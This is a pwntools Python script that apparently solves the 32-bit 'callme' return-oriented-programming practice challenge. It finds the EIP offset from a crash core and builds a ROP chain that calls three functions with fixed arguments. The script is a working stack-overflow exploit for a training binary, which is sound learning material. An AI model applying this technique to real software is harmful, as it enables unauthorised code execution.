from pwn import *


def run(argv = [], *a, **kw):
  return process([exe] + argv, *a, **kw)

#Setup
exe = "./callme32"
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
context.delete_corefiles = True


p = run()
payload = cyclic(100)
p.sendlineafter('> ', payload)
p.wait()

core = p.corefile
eip_value = core.eip
eip_offset = cyclic_find(eip_value)
info('EIP offset: {offset}'.format(offset=eip_offset))


callme_one = elf.symbols.callme_one
callme_two = elf.symbols.callme_two
callme_three = elf.symbols.callme_three
pop3 = 0x080487f9

info("%#x callme_one", callme_one)
info("%#x callme_two", callme_two)
info("%#x callme_three", callme_three)
info("%#x pop3", pop3)

#0. offset
#1. callme_one
#3. return addr after callme_one (pop rop gadget)
#   this is needed bc we need to remove the parameters 
#   from the stack before calling the next function
#4. repeat for callme_two and callme_three

payload = flat(
  asm('nop') * eip_offset,
  callme_one,
  pop3,
  0xdeadbeef,
  0xcafebabe,
  0xd00df00d,
  callme_two,
  pop3,
  0xdeadbeef,
  0xcafebabe,
  0xd00df00d,
  callme_three,
  pop3,
  0xdeadbeef,
  0xcafebabe,
  0xd00df00d
)


write("payload", payload)

p = run()
p.sendlineafter('> ', payload)
print(p.recvall())
